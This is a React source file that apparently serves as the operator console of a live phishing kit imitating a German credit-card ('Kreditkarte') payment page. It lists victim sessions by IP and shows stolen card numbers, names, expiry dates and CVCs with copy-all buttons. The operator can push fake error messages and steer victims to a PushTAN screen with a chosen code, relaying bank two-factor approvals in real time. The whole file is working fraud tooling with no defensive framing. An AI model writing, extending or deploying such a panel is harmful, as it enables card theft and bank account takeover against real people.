"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  CreditCard,
  X,
  AlertTriangle,
  MessageSquare,
  RefreshCw,
  Send,
  Search,
  KeyRound,
  ArrowRight,
  RotateCcw,
  Eye,
  EyeOff,
  Copy,
  Check,
} from "lucide-react";
import { BankAvatar } from "@/components/BankAvatar";

/* ------------------------------------------------------------------ */
/*  Types                                                              */
/* ------------------------------------------------------------------ */

type Submission = {
  id: string;
  step: string;
  data: Record<string, unknown>;
  createdAt: string;
};

type Session = {
  id: string;
  shortCode: string;
  bank: { slug: string; name: string };
  listing: { id: string; slug: string; title: string } | null;
  currentStep: string;
  pendingCommand: {
    type: string;
    payload: Record<string, unknown>;
    issuedAt: string;
  } | null;
  lastSeenAt: string;
  createdAt: string;
  ip: string;
  submissions: Submission[];
};

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

const POLL_INTERVAL = 2000;
const TOAST_TTL = 5000;
const NEW_SUBMISSION_BADGE_TTL = 4000;

const ERROR_PRESETS = [
  "Card details are incorrect. Please check and try again.",
  "Transaction declined. Please contact your bank.",
  "Card expired. Please use another card.",
  "Verification failed. Please try again.",
  // German presets
  "Kartendaten sind ungultig. Bitte uberprufen Sie Ihre Eingabe.",
  "Transaktion abgelehnt. Bitte kontaktieren Sie Ihre Bank.",
  "Karte abgelaufen. Bitte verwenden Sie eine andere Karte.",
  "Verifizierung fehlgeschlagen. Bitte versuchen Sie es erneut.",
];

/* ------------------------------------------------------------------ */
/*  Toast system                                                       */
/* ------------------------------------------------------------------ */

type Toast = {
  id: string;
  message: string;
  accent: "green" | "red" | "blue";
  createdAt: number;
};

let toastIdCounter = 0;
function nextToastId() {
  return `toast-${++toastIdCounter}-${Date.now()}`;
}

/* ------------------------------------------------------------------ */
/*  Audio helper (Web Audio API beep)                                  */
/* ------------------------------------------------------------------ */

let audioCtx: AudioContext | null = null;

function playNotificationBeep() {
  try {
    if (!audioCtx) {
      audioCtx = new AudioContext();
    }
    const ctx = audioCtx;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);

    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(660, ctx.currentTime + 0.08);

    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);

    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.15);
  } catch {
    // Audio not available - silent fail
  }
}

/* ------------------------------------------------------------------ */
/*  Card number helpers                                                */
/* ------------------------------------------------------------------ */

function maskCardNumber(num: string): string {
  const digits = num.replace(/\s+/g, "");
  if (digits.length < 4) return digits;
  return "**** **** **** " + digits.slice(-4);
}

function formatCardNumber(num: string): string {
  const digits = num.replace(/\s+/g, "");
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

/* ------------------------------------------------------------------ */
/*  Clipboard helper                                                   */
/* ------------------------------------------------------------------ */

function useCopyToClipboard() {
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const copy = useCallback((text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => setCopiedField(null), 1500);
  }, []);

  return { copiedField, copy };
}

/* ------------------------------------------------------------------ */
/*  Main component                                                     */
/* ------------------------------------------------------------------ */

export default function CreditCardsPage() {
  /* ---- core state ---- */
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  /* ---- command form state ---- */
  const [customError, setCustomError] = useState("");
  const [forwardTanCode, setForwardTanCode] = useState("");

  /* ---- search state ---- */
  const [searchQuery, setSearchQuery] = useState("");

  /* ---- toast state ---- */
  const [toasts, setToasts] = useState<Toast[]>([]);

  /* ---- tracking refs for diff between polls ---- */
  const prevSessionIdsRef = useRef<Set<string>>(new Set());
  const prevSubmissionCountsRef = useRef<Map<string, number>>(new Map());
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- new-submission badges: sessionId -> timeout handle ---- */
  const [newSubmissionBadges, setNewSubmissionBadges] = useState<Set<string>>(
    new Set()
  );
  const badgeTimersRef = useRef<Map<string, ReturnType<typeof setTimeout>>>(
    new Map()
  );

  /* ---- submissions flash for selected session ---- */
  const [submissionsFlash, setSubmissionsFlash] = useState(false);
  const flashTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  /* ---- closed sessions counter ---- */
  const [closedToday, setClosedToday] = useState(0);

  /* ---- helpers ---- */
  const addToast = useCallback(
    (message: string, accent: "green" | "red" | "blue" = "green") => {
      const id = nextToastId();
      setToasts((prev) => [
        ...prev,
        { id, message, accent, createdAt: Date.now() },
      ]);
      setTimeout(() => {
        setToasts((prev) => prev.filter((t) => t.id !== id));
      }, TOAST_TTL);
    },
    []
  );

  const addNewSubmissionBadge = useCallback((sessionId: string) => {
    const existing = badgeTimersRef.current.get(sessionId);
    if (existing) clearTimeout(existing);

    setNewSubmissionBadges((prev) => new Set(prev).add(sessionId));

    const timer = setTimeout(() => {
      setNewSubmissionBadges((prev) => {
        const next = new Set(prev);
        next.delete(sessionId);
        return next;
      });
      badgeTimersRef.current.delete(sessionId);
    }, NEW_SUBMISSION_BADGE_TTL);

    badgeTimersRef.current.set(sessionId, timer);
  }, []);

  /* ---- data loading (filtered to kreditkarte only) ---- */
  const load = useCallback(async () => {
    try {
      const res = await fetch("/api/banks/sessions");
      const d = await res.json();
      const allItems: Session[] = d.items || [];
      const items = allItems.filter((s) => s.bank.slug === "kreditkarte");

      setSessions((prevSessions) => {
        const currentIds = new Set(items.map((s) => s.id));
        const prevIds = prevSessionIdsRef.current;

        // Detect new sessions
        const newSessions = items.filter((s) => !prevIds.has(s.id));
        if (prevIds.size > 0 && newSessions.length > 0) {
          for (const ns of newSessions) {
            addToast(`New card session ${ns.shortCode}`, "green");
          }
          playNotificationBeep();
        }

        // Detect new submissions
        const prevCounts = prevSubmissionCountsRef.current;
        for (const s of items) {
          const prevCount = prevCounts.get(s.id) ?? 0;
          const currentCount = s.submissions.length;
          if (prevCount > 0 && currentCount > prevCount) {
            addNewSubmissionBadge(s.id);
          }
        }

        // Update refs
        prevSessionIdsRef.current = currentIds;
        const nextCounts = new Map<string, number>();
        for (const s of items) {
          nextCounts.set(s.id, s.submissions.length);
        }
        prevSubmissionCountsRef.current = nextCounts;

        return items;
      });

      setLoading(false);
    } catch {
      // network error - keep previous state
    }
  }, [addToast, addNewSubmissionBadge]);

  useEffect(() => {
    load();
    intervalRef.current = setInterval(load, POLL_INTERVAL);
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [load]);

  /* ---- detect new submissions on selected session for flash ---- */
  const selectedSession = sessions.find((s) => s.id === selectedId) ?? null;
  const selectedSubCountRef = useRef(0);

  useEffect(() => {
    if (!selectedSession) {
      selectedSubCountRef.current = 0;
      return;
    }
    const currentCount = selectedSession.submissions.length;
    if (
      selectedSubCountRef.current > 0 &&
      currentCount > selectedSubCountRef.current
    ) {
      setSubmissionsFlash(true);
      if (flashTimerRef.current) clearTimeout(flashTimerRef.current);
      flashTimerRef.current = setTimeout(() => setSubmissionsFlash(false), 800);
    }
    selectedSubCountRef.current = currentCount;
  }, [selectedSession?.submissions.length, selectedSession]);

  /* ---- commands ---- */
  const sendCommand = async (
    sessionId: string,
    type: string,
    payload: Record<string, unknown> = {}
  ) => {
    setSessions((prev) =>
      prev.map((s) =>
        s.id === sessionId
          ? {
              ...s,
              pendingCommand: {
                type,
                payload,
                issuedAt: new Date().toISOString(),
              },
            }
          : s
      )
    );
    await fetch(`/api/banks/sessions/${sessionId}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, payload }),
    });
  };

  const closeSession = async (sessionId: string) => {
    const session = sessions.find((s) => s.id === sessionId);
    const code = session?.shortCode ?? sessionId.slice(0, 8);

    setSessions((prev) => prev.filter((s) => s.id !== sessionId));
    if (selectedId === sessionId) setSelectedId(null);
    setClosedToday((c) => c + 1);

    addToast(`Session ${code} closed`, "red");

    await fetch(`/api/banks/sessions/${sessionId}/close`, { method: "POST" });
  };

  /* ---- derived data ---- */
  const filteredSessions = useMemo(() => {
    if (!searchQuery.trim()) return sessions;
    const q = searchQuery.toLowerCase().trim();
    return sessions.filter(
      (s) =>
        s.shortCode.toLowerCase().includes(q) ||
        s.ip.toLowerCase().includes(q)
    );
  }, [sessions, searchQuery]);

  /* ---------------------------------------------------------------- */
  /*  Render                                                           */
  /* ---------------------------------------------------------------- */

  return (
    <div className="space-y-4 relative">
      {/* ---- Toast container ---- */}
      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2 pointer-events-none">
        {toasts.map((t) => (
          <div
            key={t.id}
            className={`
              pointer-events-auto px-4 py-3 rounded-xl text-sm font-medium shadow-lg
              border backdrop-blur-sm animate-slide-in-right
              ${
                t.accent === "green"
                  ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-300"
                  : t.accent === "red"
                    ? "bg-red-500/15 border-red-500/30 text-red-300"
                    : "bg-blue-500/15 border-blue-500/30 text-blue-300"
              }
            `}
          >
            {t.message}
          </div>
        ))}
      </div>

      {/* ---- Page header ---- */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
            <CreditCard className="w-5 h-5 text-violet-400" />
            Credit Card Sessions
          </h1>
          <p className="text-[#6B6B6B] text-sm mt-1">
            Live Kreditkarte sessions. Polling every 2s.
          </p>
        </div>
        <div className="flex items-center gap-3 text-xs text-[#6B6B6B]">
          {closedToday > 0 && (
            <span className="text-[#4A4A4A]">
              {closedToday} closed today
            </span>
          )}
          <span className="flex items-center gap-1.5">
            <span className="w-2 h-2 rounded-full bg-violet-400 animate-pulse" />
            {sessions.length} active
          </span>
        </div>
      </div>

      {/* ---- Main grid ---- */}
      <div className="grid grid-cols-1 lg:grid-cols-[400px_1fr] gap-4">
        {/* ========= Sessions list ========= */}
        <div
          className="bg-[#141414] rounded-2xl overflow-hidden flex flex-col"
          style={{ maxHeight: "calc(100vh - 200px)" }}
        >
          {/* List header */}
          <div className="px-4 py-3 border-b border-[#1E1E1E] flex items-center justify-between shrink-0">
            <p className="text-xs font-medium text-[#6B6B6B] uppercase tracking-wider">
              Card sessions
            </p>
            <div className="flex items-center gap-2">
              <span className="text-[10px] text-[#4A4A4A]">
                {filteredSessions.length}
                {filteredSessions.length !== sessions.length
                  ? ` / ${sessions.length}`
                  : ""}
              </span>
              <RefreshCw
                className="w-3.5 h-3.5 text-[#6B6B6B] animate-spin"
                style={{ animationDuration: "2s" }}
              />
            </div>
          </div>

          {/* Search box */}
          <div className="px-3 py-2 border-b border-[#1E1E1E] shrink-0">
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[#4A4A4A]" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search by #code or IP..."
                className="w-full pl-8 pr-3 py-2 bg-[#1E1E1E] rounded-lg text-white text-xs placeholder:text-[#4A4A4A] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
              />
              {searchQuery && (
                <button
                  type="button"
                  onClick={() => setSearchQuery("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-[#6B6B6B] hover:text-white cursor-pointer"
                >
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>
          </div>

          {/* Scrollable session list */}
          {loading ? (
            <div className="px-4 py-10 text-center text-[#6B6B6B] text-sm">
              Loading...
            </div>
          ) : filteredSessions.length === 0 ? (
            <div className="px-4 py-16 text-center text-[#6B6B6B] text-sm">
              {sessions.length === 0 ? (
                <>
                  No active card sessions.
                  <div className="text-[#4A4A4A] text-xs mt-2">
                    Sessions appear when a user opens a Kreditkarte page.
                  </div>
                </>
              ) : (
                <>No sessions match your search.</>
              )}
            </div>
          ) : (
            <div className="flex-1 overflow-y-auto divide-y divide-[#1E1E1E]">
              {filteredSessions.map((s) => {
                const idleSec = Math.floor(
                  (Date.now() - new Date(s.lastSeenAt).getTime()) / 1000
                );
                const isActive = idleSec < 5;
                const hasNewSub = newSubmissionBadges.has(s.id);

                return (
                  <button
                    key={s.id}
                    onClick={() => setSelectedId(s.id)}
                    className={`w-full px-4 py-2.5 flex items-center gap-3 text-left cursor-pointer transition-colors ${
                      selectedId === s.id
                        ? "bg-[#1E1E1E]"
                        : "hover:bg-[#181818]"
                    }`}
                    type="button"
                  >
                    <BankAvatar
                      name={s.bank.name}
                      slug={s.bank.slug}
                      size={30}
                    />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-1.5">
                        <span className="text-[11px] font-mono text-violet-400 shrink-0">
                          {s.shortCode}
                        </span>
                        <span className="text-[11px] text-[#4A4A4A] shrink-0">
                          {"·"}
                        </span>
                        <span className="text-xs font-medium text-white truncate">
                          Kreditkarte
                        </span>
                        {s.pendingCommand && (
                          <span className="text-[9px] px-1.5 py-0.5 bg-amber-500/20 text-amber-300 rounded shrink-0">
                            CMD
                          </span>
                        )}
                        {hasNewSub && (
                          <span className="w-2 h-2 rounded-full bg-blue-400 animate-pulse shrink-0" />
                        )}
                      </div>
                      <div className="text-[10px] text-[#6B6B6B] truncate">
                        step: {s.currentStep} {"·"} IP {s.ip || "—"}
                      </div>
                    </div>
                    <div className="text-right shrink-0">
                      <div
                        className={`text-[10px] flex items-center gap-1 ${
                          isActive ? "text-emerald-400" : "text-[#6B6B6B]"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${
                            isActive ? "bg-emerald-400" : "bg-[#4A4A4A]"
                          }`}
                        />
                        {idleSec < 5 ? "live" : `${idleSec}s`}
                      </div>
                    </div>
                  </button>
                );
              })}
            </div>
          )}
        </div>

        {/* ========= Detail panel ========= */}
        <div className="bg-[#141414] rounded-2xl overflow-hidden">
          {!selectedSession ? (
            <div className="px-6 py-20 text-center text-[#6B6B6B] text-sm">
              Select a card session from the left to manage it.
            </div>
          ) : (
            <div
              className="flex flex-col"
              style={{ maxHeight: "calc(100vh - 200px)" }}
            >
              {/* Detail header */}
              <div className="px-5 py-4 border-b border-[#1E1E1E] flex items-center gap-3 shrink-0">
                <BankAvatar
                  name={selectedSession.bank.name}
                  slug={selectedSession.bank.slug}
                  size={36}
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-mono text-violet-400">
                      {selectedSession.shortCode}
                    </span>
                    <span className="text-sm font-semibold text-white">
                      Kreditkarte
                    </span>
                  </div>
                  <div className="text-[11px] text-[#6B6B6B] truncate">
                    IP {selectedSession.ip || "—"} {"·"} step:{" "}
                    {selectedSession.currentStep}
                  </div>
                </div>
                <button
                  onClick={() => closeSession(selectedSession.id)}
                  className="px-3 py-1.5 text-xs text-red-300 bg-red-500/10 hover:bg-red-500/20 rounded-full cursor-pointer transition-colors"
                  type="button"
                  title="Close session"
                >
                  <X className="w-3.5 h-3.5 inline mr-1" />
                  Close
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-5 space-y-5">
                {/* Pending command */}
                {selectedSession.pendingCommand && (
                  <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs">
                    <div className="text-amber-300 font-medium mb-1">
                      Pending command:{" "}
                      {selectedSession.pendingCommand.type}
                    </div>
                    <pre className="text-[10px] text-amber-200/70 overflow-x-auto">
                      {JSON.stringify(
                        selectedSession.pendingCommand.payload,
                        null,
                        2
                      )}
                    </pre>
                  </div>
                )}

                {/* Recent submissions (card data) */}
                <div
                  className={`transition-all duration-300 rounded-xl ${
                    submissionsFlash
                      ? "ring-2 ring-blue-400/50 bg-blue-500/5"
                      : ""
                  }`}
                >
                  <Section
                    icon={<MessageSquare className="w-4 h-4" />}
                    title={`Recent submissions (${selectedSession.submissions.length})`}
                  >
                    {selectedSession.submissions.length === 0 ? (
                      <p className="text-xs text-[#6B6B6B]">
                        No submissions yet. Waiting for card data...
                      </p>
                    ) : (
                      <div className="space-y-3">
                        {selectedSession.submissions.map((sub) => (
                          <CardSubmission key={sub.id} submission={sub} />
                        ))}
                      </div>
                    )}
                  </Section>
                </div>

                {/* Step Control */}
                <Section
                  icon={<ArrowRight className="w-4 h-4" />}
                  title="Step Control"
                  note="Navigate the user between steps"
                >
                  <div className="flex gap-2 flex-wrap">
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "back_to_login", {})
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-red-300 text-xs rounded-xl cursor-pointer transition-colors flex items-center gap-1.5"
                      type="button"
                    >
                      <RotateCcw className="w-3.5 h-3.5" />
                      Back to card form
                    </button>
                  </div>
                  <div className="flex gap-2 mt-2">
                    <input
                      type="text"
                      value={forwardTanCode}
                      onChange={(e) =>
                        setForwardTanCode(e.target.value.toUpperCase())
                      }
                      placeholder="Enter code (e.g. 67LL)..."
                      maxLength={6}
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs font-mono tracking-wider focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && forwardTanCode.trim()) {
                          sendCommand(selectedSession.id, "forward_to_tan", {
                            code: forwardTanCode.trim(),
                          });
                          setForwardTanCode("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!forwardTanCode.trim()) return;
                        sendCommand(selectedSession.id, "forward_to_tan", {
                          code: forwardTanCode.trim(),
                        });
                        setForwardTanCode("");
                      }}
                      disabled={!forwardTanCode.trim()}
                      className="px-4 py-2.5 bg-violet-500/20 hover:bg-violet-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-violet-300 text-xs font-medium rounded-xl cursor-pointer transition-colors flex items-center gap-1.5"
                      type="button"
                    >
                      <ArrowRight className="w-3.5 h-3.5" />
                      Forward to PushTAN
                    </button>
                  </div>
                  <p className="text-[10px] text-[#6B6B6B] mt-2">
                    Enter the Vergleichswert code that will be shown on the
                    PushTAN screen.
                  </p>
                </Section>

                {/* TAN Response */}
                <Section
                  icon={<KeyRound className="w-4 h-4" />}
                  title="TAN Response"
                  note="Use after user is on PushTAN screen"
                >
                  <div className="flex gap-2 flex-wrap">
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "reject_tan", {
                          message:
                            "TAN code is incorrect. Please try again.",
                        })
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-red-300 text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Reject TAN
                    </button>
                    <button
                      onClick={() =>
                        sendCommand(selectedSession.id, "retry_tan", {
                          message:
                            "Code expired. Please enter the new code.",
                        })
                      }
                      className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-amber-300 text-xs rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      Wrong code, retry
                    </button>
                  </div>
                </Section>

                {/* Show Error */}
                <Section
                  icon={<AlertTriangle className="w-4 h-4" />}
                  title="Show error to user"
                >
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {ERROR_PRESETS.map((msg) => (
                      <button
                        key={msg}
                        onClick={() =>
                          sendCommand(selectedSession.id, "show_error", {
                            message: msg,
                          })
                        }
                        className="px-3 py-2.5 bg-[#1E1E1E] hover:bg-[#2A2A2A] text-white text-xs rounded-xl text-left cursor-pointer transition-colors"
                        type="button"
                      >
                        {msg}
                      </button>
                    ))}
                  </div>
                  <div className="flex gap-2 mt-2">
                    <input
                      type="text"
                      value={customError}
                      onChange={(e) => setCustomError(e.target.value)}
                      placeholder="Custom error message..."
                      className="flex-1 px-3 py-2.5 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A]"
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && customError.trim()) {
                          sendCommand(selectedSession.id, "show_error", {
                            message: customError.trim(),
                          });
                          setCustomError("");
                        }
                      }}
                    />
                    <button
                      onClick={() => {
                        if (!customError.trim()) return;
                        sendCommand(selectedSession.id, "show_error", {
                          message: customError.trim(),
                        });
                        setCustomError("");
                      }}
                      disabled={!customError.trim()}
                      className="px-4 py-2.5 bg-white hover:bg-[#E8E8E8] disabled:opacity-30 disabled:cursor-not-allowed text-[#0A0A0A] text-xs font-medium rounded-xl cursor-pointer transition-colors"
                      type="button"
                    >
                      <Send className="w-3.5 h-3.5 inline mr-1" />
                      Send
                    </button>
                  </div>
                  <button
                    onClick={() =>
                      sendCommand(selectedSession.id, "clear_error")
                    }
                    className="mt-2 text-xs text-[#A8A29E] hover:text-white cursor-pointer"
                    type="button"
                  >
                    Clear current error
                  </button>
                </Section>

                {/* Close session */}
                <div className="pt-2 border-t border-[#1E1E1E]">
                  <button
                    onClick={() => closeSession(selectedSession.id)}
                    className="w-full px-4 py-3 bg-red-500/10 hover:bg-red-500/20 text-red-300 text-xs font-medium rounded-xl cursor-pointer transition-colors flex items-center justify-center gap-2"
                    type="button"
                  >
                    <X className="w-4 h-4" />
                    Close session
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  CardSubmission — renders card data nicely with masked numbers      */
/* ------------------------------------------------------------------ */

function CardSubmission({ submission }: { submission: Submission }) {
  const [showFull, setShowFull] = useState(false);
  const { copiedField, copy } = useCopyToClipboard();

  const data = submission.data;
  const cardNumber = typeof data.cardNumber === "string" ? data.cardNumber : null;
  const cardName = typeof data.cardName === "string" ? data.cardName : null;
  const cardExpiry = typeof data.cardExpiry === "string" ? data.cardExpiry : null;
  const cardCvc = typeof data.cardCvc === "string" ? data.cardCvc : null;

  const isCardData = cardNumber || cardName || cardExpiry || cardCvc;

  return (
    <div className="bg-[#1E1E1E] rounded-xl p-3">
      <div className="flex items-center justify-between mb-2">
        <span className="text-[11px] px-2 py-0.5 bg-[#2A2A2A] rounded-full text-[#A8A29E]">
          {submission.step}
        </span>
        <span className="text-[10px] text-[#6B6B6B]">
          {new Date(submission.createdAt).toLocaleTimeString()}
        </span>
      </div>

      {isCardData ? (
        <div className="space-y-2">
          {/* Card number */}
          {cardNumber && (
            <div className="flex items-center justify-between gap-2">
              <div className="flex-1 min-w-0">
                <div className="text-[10px] text-[#6B6B6B] uppercase tracking-wider mb-0.5">
                  Card Number
                </div>
                <div className="text-sm font-mono text-white tracking-wider">
                  {showFull
                    ? formatCardNumber(cardNumber)
                    : maskCardNumber(cardNumber)}
                </div>
              </div>
              <div className="flex items-center gap-1 shrink-0">
                <button
                  type="button"
                  onClick={() => setShowFull(!showFull)}
                  className="p-1.5 rounded-lg hover:bg-[#2A2A2A] text-[#6B6B6B] hover:text-white transition-colors cursor-pointer"
                  title={showFull ? "Mask number" : "Reveal number"}
                >
                  {showFull ? (
                    <EyeOff className="w-3.5 h-3.5" />
                  ) : (
                    <Eye className="w-3.5 h-3.5" />
                  )}
                </button>
                <button
                  type="button"
                  onClick={() => copy(cardNumber, `num-${submission.id}`)}
                  className="p-1.5 rounded-lg hover:bg-[#2A2A2A] text-[#6B6B6B] hover:text-white transition-colors cursor-pointer"
                  title="Copy card number"
                >
                  {copiedField === `num-${submission.id}` ? (
                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>
          )}

          {/* Name, Expiry, CVC row */}
          <div className="grid grid-cols-3 gap-3">
            {cardName && (
              <div>
                <div className="text-[10px] text-[#6B6B6B] uppercase tracking-wider mb-0.5">
                  Name
                </div>
                <div className="text-xs text-white truncate">{cardName}</div>
              </div>
            )}
            {cardExpiry && (
              <div>
                <div className="text-[10px] text-[#6B6B6B] uppercase tracking-wider mb-0.5">
                  Expiry
                </div>
                <div className="text-xs font-mono text-white">{cardExpiry}</div>
              </div>
            )}
            {cardCvc && (
              <div>
                <div className="text-[10px] text-[#6B6B6B] uppercase tracking-wider mb-0.5">
                  CVC
                </div>
                <div className="text-xs font-mono text-white">{cardCvc}</div>
              </div>
            )}
          </div>

          {/* Copy all button */}
          <button
            type="button"
            onClick={() => {
              const parts = [
                cardNumber && `Card: ${cardNumber}`,
                cardName && `Name: ${cardName}`,
                cardExpiry && `Exp: ${cardExpiry}`,
                cardCvc && `CVC: ${cardCvc}`,
              ]
                .filter(Boolean)
                .join("\n");
              copy(parts, `all-${submission.id}`);
            }}
            className="mt-1 px-3 py-1.5 text-[10px] bg-[#2A2A2A] hover:bg-[#333333] text-[#A8A29E] hover:text-white rounded-lg transition-colors cursor-pointer flex items-center gap-1.5"
          >
            {copiedField === `all-${submission.id}` ? (
              <>
                <Check className="w-3 h-3 text-emerald-400" />
                Copied all
              </>
            ) : (
              <>
                <Copy className="w-3 h-3" />
                Copy all card data
              </>
            )}
          </button>

          {/* Raw JSON (collapsed) */}
          <details className="mt-2">
            <summary className="text-[10px] text-[#4A4A4A] cursor-pointer hover:text-[#6B6B6B] transition-colors">
              Raw JSON
            </summary>
            <pre className="text-[10px] text-[#6B6B6B] overflow-x-auto mt-1 p-2 bg-[#161616] rounded-lg">
              {JSON.stringify(data, null, 2)}
            </pre>
          </details>
        </div>
      ) : (
        /* Non-card data: show as raw JSON */
        <pre className="text-[11px] text-white overflow-x-auto">
          {JSON.stringify(data, null, 2)}
        </pre>
      )}
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  Section helper                                                     */
/* ------------------------------------------------------------------ */

function Section({
  icon,
  title,
  note,
  children,
}: {
  icon: React.ReactNode;
  title: string;
  note?: string;
  children: React.ReactNode;
}) {
  return (
    <div>
      <div className="flex items-center gap-1.5 text-xs font-medium text-[#A8A29E] uppercase tracking-wider mb-2">
        {icon}
        <span>{title}</span>
        {note && (
          <span className="ml-1 text-[10px] normal-case font-normal text-[#4A4A4A] tracking-normal">
            — {note}
          </span>
        )}
      </div>
      {children}
    </div>
  );
}
